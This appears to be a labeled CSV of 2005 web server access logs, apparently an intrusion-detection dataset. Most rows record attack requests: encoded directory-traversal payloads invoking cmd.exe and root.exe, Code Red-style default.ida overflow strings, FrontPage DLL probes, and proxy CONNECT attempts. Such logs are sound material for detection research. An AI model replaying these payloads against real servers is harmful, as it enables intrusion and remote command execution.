Date~,Time~,ClientIP$,HTTP_method,ClientRequestLine@,Http_protocol@,StatusCode,ObjectSize~,Referrer~,Agent@,label_event_type~,label_IPpair_ID~
"2005-01-30","19:13:42","69.233.130.234","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:43","69.233.130.234","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:43","69.233.130.234","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:44","69.233.130.234","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:44","69.233.130.234","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:45","69.233.130.234","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S544"
"2005-01-30","19:13:45","69.233.130.234","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S544"
"2005-01-30","19:13:46","69.233.130.234","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","19:13:46","69.233.130.234","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S544"
"2005-01-30","20:13:36","218.26.187.153","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S205"
"2005-01-30","20:39:35","202.253.200.65","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S80"
"2005-01-30","21:03:22","218.74.23.91","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S219"
"2005-01-30","23:50:12","61.190.72.114","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S402"
"2005-01-31","00:30:23","67.181.19.171","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:23","67.181.19.171","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:23","67.181.19.171","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:24","67.181.19.171","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:24","67.181.19.171","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:24","67.181.19.171","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:24","67.181.19.171","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:25","67.181.19.171","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:25","67.181.19.171","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:25","67.181.19.171","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:25","67.181.19.171","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:26","67.181.19.171","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:26","67.181.19.171","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S506"
"2005-01-31","00:30:26","67.181.19.171","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S506"
"2005-01-31","00:30:26","67.181.19.171","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","00:30:27","67.181.19.171","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S506"
"2005-01-31","01:14:32","211.22.73.68","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S151"
"2005-01-31","01:14:32","211.22.73.68","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S151"
"2005-01-31","01:14:36","211.22.73.68","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S151"
"2005-01-31","01:14:36","211.22.73.68","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S151"
"2005-01-31","01:14:36","211.22.73.68","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S151"
"2005-01-31","01:14:40","211.22.73.68","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S151"
"2005-01-31","02:05:40","211.22.102.234","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S150"
"2005-01-31","02:18:38","65.202.15.194","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S460"
"2005-01-31","03:26:15","61.10.7.127","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S362"
"2005-01-31","03:58:18","218.28.40.100","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S207"
"2005-01-31","03:58:20","218.28.40.100","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S207"
"2005-01-31","03:58:23","218.28.40.100","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S207"
"2005-01-31","03:58:25","218.28.40.100","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S207"
"2005-01-31","03:58:28","218.28.40.100","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S207"
"2005-01-31","03:58:30","218.28.40.100","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S207"
"2005-01-31","03:58:36","218.28.40.100","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S207"
"2005-01-31","03:58:41","218.28.40.100","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S207"
"2005-01-31","05:19:36","61.183.208.219","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S399"
"2005-01-31","06:20:44","210.22.146.234","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S128"
"2005-01-31","07:48:45","68.214.68.216","GET","/","HTTP/1.1","'403'",2898,"-","-","AE","S520"
"2005-01-31","08:29:24","68.214.68.216","GET","/","HTTP/1.1","'403'",2898,"-","-","AE","S520"
"2005-01-31","09:54:07","65.122.119.10","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S454"
"2005-01-31","13:39:22","222.166.160.129","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S291"
"2005-01-31","19:00:01","66.255.109.222","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S481"
"2005-01-31","19:28:04","199.63.0.1","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S60"
"2005-01-31","21:34:52","24.94.203.115","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S344"
"2005-01-31","22:19:49","221.79.146.7","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S286"
"2005-01-31","23:15:20","70.48.9.26","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S561"
"2005-01-31","23:19:47","222.166.160.87","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S311"
"2005-01-31","23:20:53","70.183.86.76","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S560"
"2005-02-01","04:40:59","62.177.153.106","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S420"
"2005-02-01","08:24:16","218.22.120.198","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S195"
"2005-02-01","08:54:05","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:05","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:07","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:07","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:07","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:07","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:07","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:07","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:07","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:06","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:07","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:05","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:05","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:05","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:05","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:05","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:05","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:09","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:09","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:09","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:09","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:09","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","08:54:09","65.117.45.251","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",407,"-","-","AC","S453"
"2005-02-01","09:14:50","222.83.129.198","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S316"
"2005-02-01","11:29:32","216.70.251.2","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S171"
"2005-02-01","12:07:54","68.223.144.102","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S522"
"2005-02-01","13:33:10","221.184.100.13","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:10","221.184.100.13","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:11","221.184.100.13","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:11","221.184.100.13","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:12","221.184.100.13","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:16","221.184.100.13","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:16","221.184.100.13","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:17","221.184.100.13","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:17","221.184.100.13","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:18","221.184.100.13","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:18","221.184.100.13","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:19","221.184.100.13","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:19","221.184.100.13","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S276"
"2005-02-01","13:33:20","221.184.100.13","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S276"
"2005-02-01","13:33:21","221.184.100.13","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:33:21","221.184.100.13","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S276"
"2005-02-01","13:34:30","64.192.107.195","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S442"
"2005-02-01","13:52:33","81.6.250.202","GET","/NULL.printer","-","'404'",1061,"-","-","AA","S575"
"2005-02-01","17:01:12","193.95.148.135","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S51"
"2005-02-01","17:27:18","218.242.255.106","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S204"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","17:45:31","69.86.160.253","GET","/","HTTP/1.0","'403'",2898,"-","-","AE","S552"
"2005-02-01","19:48:32","63.245.85.123","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S434"
"2005-02-01","20:52:07","64.85.244.116","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S448"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:22","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:23","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:23","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
"2005-02-01","23:35:23","82.229.169.73","CONNECT","1.3.3.7:1337","HTTP/1.0","'405'",975,"-","-","AD","S578"
